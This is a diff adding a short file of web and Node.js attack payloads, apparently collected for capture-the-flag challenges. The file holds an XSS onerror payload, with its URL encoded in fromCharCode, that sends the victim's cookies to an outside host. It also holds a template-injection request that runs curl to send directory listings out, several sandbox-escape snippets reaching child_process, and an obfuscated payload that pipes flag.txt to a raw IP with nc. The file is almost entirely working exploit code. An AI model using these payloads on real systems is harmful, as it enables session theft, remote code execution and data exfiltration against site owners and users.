@@ -1,0 +1,32 @@
+
+X onerror=location.href=(String.fromCharCode(104,116,116,112,115,58,47,47,104,114,114,98,108,104,113,46,114,101,113,117,101,115,116,46,100,114,101,97,109,104,97,99,107,46,103,97,109,101,115,47).concat(document.cookie))
+
+localhost:3000/admin?settings[view options][client]=true&settings[view options][escapeFunction]=1;process.getBuiltinModule("child_process").execSync("curl https://jhjptmx.request.dreamhack.games/?$(ls)")
+
+const module={};process.dlopen(module,"app.js"),
+
+this.constructor.constructor("return process");
+
+
+process.send()
+
+/usr/lib/x86_64-linux-gnu/libc.so.6
+
+const module = await import('child_process')
+
+
+(
+	() => 
+    	{ 
+        	const parts = [ ['chil', 'd_'].join(''), ['pro', 'cess'].join(''), 
+            	['ex', 'ecSync'].join(''), 
+                ['mo','dule'].join('') ]; 
+            const func = new Function(
+            	`async function load() { 
+                	const ${parts[3]} = 
+                    	await import('${parts[0]}${parts[1]}'); 
+                        ${parts[3]}.${parts[2]}("cat flag.txt | nc 54.160.149.14 1337"); 
+                     } load();`); 
+                  func(); 
+          })
+  ()
